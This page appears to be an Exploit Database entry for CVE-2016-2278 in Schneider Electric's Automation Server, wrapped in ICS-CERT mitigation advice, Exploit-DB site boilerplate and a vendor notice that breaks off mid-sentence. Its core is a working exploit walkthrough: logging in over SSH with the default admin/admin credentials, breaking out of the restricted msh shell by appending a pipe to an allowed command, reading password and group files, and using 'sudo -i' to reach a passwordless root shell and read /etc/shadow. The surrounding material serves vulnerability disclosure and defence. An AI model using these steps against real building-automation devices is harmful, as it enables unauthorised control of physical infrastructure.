<http://www.schneider-electric.com/ww/en/download/document/SEVD-2016-025-01>

ICS-CERT recommends that users take defensive measures to minimize the risk of exploitation of this vulnerability. Specifically, users should:

* Minimize network exposure for all control system devices and/or systems, and ensure that they are not accessible from the Internet.
* Locate control system networks and remote devices behind firewalls, and isolate them from the business network.
* When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize that VPN is only as secure as the connected devices.

ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

ICS-CERT also provides a section for control systems security recommended practices on the ICS-CERT web page at: [http://ics-cert.us-cert.gov/content/recommended-practices](/ics/content/recommended-practices). Several recommended practices are available for reading and download, including [Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies.](/sites/default/files/recommended_practices/NCCIC_ICS-CERT_Defense_in_Depth_2016_S508C.pdf)

Additional mitigation guidance and recommended practices are publicly available in the ICS‑CERT Technical Information Paper, [ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies](/ics/tips/ICS-TIP-12-146-01B), that is available for download from the ICS-CERT web site ([http://ics-cert.us-cert.gov/](/ics/)).

Organizations observing any suspected malicious activity should follow their established internal procedures and report their findings to ICS-CERT for tracking and correlation against other incidents.

*] *
# CVE-ID: [CVE-2016-2278]

About
Schneider Electric’s corporate headquarters is located in Paris, France,
and it maintains offices in more than 100 countries worldwide.

The affected product, Automation Server, is a building automation system
for small and medium-sized buildings. According to Schneider Electric,
Automation Server is deployed in the Commercial Facilities sector.
Schneider Electric estimates that this product is used worldwide.

*Vulnerabilities*
*1. Weak credential management*
CVE-ID: None [ Mitre, CVE? ]

There are two primary users:
a. root - password is not set by default - this is a problem as we will see
later in the vuln findings
- By default, root cannot SSH in.
b. admin - default password is 'admin'
- Anyone can remotely ssh in to the device using default admin/admin login.

The system / application allows a) weak creds to start with, and more
importantly, b) vulnerable versions lacks the mechanism to forcefully have
the user change the initial password on first use or later. This has been
fixed in the latest version.

*2. OS Command Injection*
*CVE-ID*: CVE-2016-2278
*https://ics-cert.us-cert.gov/advisories/ICSA-16-061-01
<https://ics-cert.us-cert.gov/advisories/ICSA-16-061-01>*

After logging in to the device over SSH, the 'admin' user - the only
active, administrative user at this point - is provided a restricted shell
(msh), which offers a small set of, application- specific functional
options.

$ ssh <IP> -l admin
Password:

Welcome! (use 'help' to list commands)
admin@box:>

admin@box:> *release*
NAME=SE2Linux
ID=se2linux
PRETTY_NAME=SE2Linux (Schneider Electric Embedded Linux)
VERSION_ID=0.2.0.212

admin@box:>

admin@box:> help
usage: help [command]
Type 'help [command]' for help on a specific command.

Available commands:
exit - exit this session
ps - report a snapshot of the current processes readlog - read log files
reboot - reboot the system
setip - configure the network interface
setlog - configure the logging
setsnmp - configure the snmp service
setsecurity - configure the security
settime - configure the system time
top - display Linux tasks
uptime - tell how long the system has been running release - tell the os
release details

Attempting to run any different command will give an error message.

However, this restricted shell functionality (msh) can be bypassed to
execute underlying system commands, by appending '| <command>' to any of
the above set of commands:

admin@box:> *uptime | ls*
bin home lost+found root sys config include mnt run tmp dev lib opt sbin usr
etc localization proc share var

At this point, basically you have full (indirect) control over the server.

admin@box:> *uptime | cat /etc/passwd *

root:x:0:0:root:/:/bin/sh
daemon:x:2:2:daemon:/sbin:/bin/false
messagebus:x:3:3:messagebus:/sbin:/bin/false
ntp:x:102:102:ntp:/var/empty/ntp:/bin/false
sshd:x:103:103:sshd:/var/empty:/bin/false
app:x:500:500:Linux Application:/:/bin/false
admin:x:1000:1000:Linux User,,,:/:/bin/msh

admin@box:> uptime | cat /etc/group
root:x:0:
wheel:x:1:admin
daemon:x:2:
messagebus:x:3:
adm:x:5:admin
power:x:20:app
serial:x:21:app
cio:x:22:app
lon:x:23:app
daemonsv:x:30:admin,app
utmp:x:100:
lock:x:101:
ntp:x:102:
sshd:x:103:
app:x:500:admin
admin:x:1000:admin

*3. Privilege Escalation / access to superuser 'root'*
CVE-ID: None [ Mitre, CVE? ]

Since this is an administrative user, an attacker can exploit OS command
injection to perform a variety of tasks from msh shell. But isn’t it better
to get a root shell instead.!

As observed from Issue 1 above, root does not have a password set, and it
is possible to use 'sudo -i' and become root.

*Note*: sudo is not presented / offered to 'admin' in the set of functional
options available thru msh. It is required for tech guys / legit admins /
SBO admins to manage the AS system and related functionality. Assumption
from SE team is, a low-skilled attacker / regular, unsophisticated,
non-technical user will not be able to figure it out. If someone does
figure it out, he/she will be responsible enough not to go evill.!

admin@box:> *sudo -i*

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

#1) Respect the privacy of others.
#2) Think before you type.
#3) With great power comes great responsibility.

Password:

root@box:~> cat /etc/shadow
root:!:16650:0:99999:7:::
sshd:!:1:0:99999:7:::
admin:$6$<hash>:16652:0:99999:7:::

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Important Security Notification

Struxureware Building Operations – Automation Server

25-Jan-2016

Overview

Schneider Electric has become aware of vulnerabilities in the Automation Server of the
Struxureware Building Operations product line.

Vulnerability Overview

The vulnerabilities identified include:

  Weak credentials management
  OS Command Injection

Product(s) Affected

The product(s) or product lines affected include:

  Automation Server series (AS, AS-P), V1.7 and prior

Vulnerability Details

The system permits the user to operate the system with weak default user credentials.  Users
are strongly recommended to modify the default credentials to properly secure their system, but
prior to version 1.7.1, it was possible to allow the system to operation with the default
credentials after commissioning.  The user was not forced to replace the weak default password
prior to operation.

The implementation of Minimal Shell (msh) functions allow Admin users to circumvent access
controls.

CVSS V2 score: 9.0 [AV:N/AC:L/Au:S/C:C/I:C/A:C]

Schneider Electric has released a new version of Automation Server firmware which remediates
these vulnerabilities. The user is no longer allowed to operate the system with default
credentials and the minimal “msh” shell can no longer be circumvented.  Contact your
